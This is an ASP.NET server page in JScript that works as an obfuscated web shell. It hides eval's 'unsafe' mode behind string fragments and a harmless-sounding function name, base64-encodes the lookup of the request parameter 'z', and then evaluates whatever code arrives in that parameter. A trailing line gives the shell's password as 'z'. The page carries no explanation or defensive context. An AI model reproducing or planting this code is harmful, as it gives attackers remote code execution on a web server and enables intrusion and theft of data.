<script runat="server" language="JScript">
function popup(str) {
var q = "u";
var w = "afe";
var a = q + "ns" + w;
var b= eval(str,a);
return(b);
}
</script>
<%
popup(popup(System.Text.Encoding.GetEncoding(65001).

GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0="))));

%>

password:z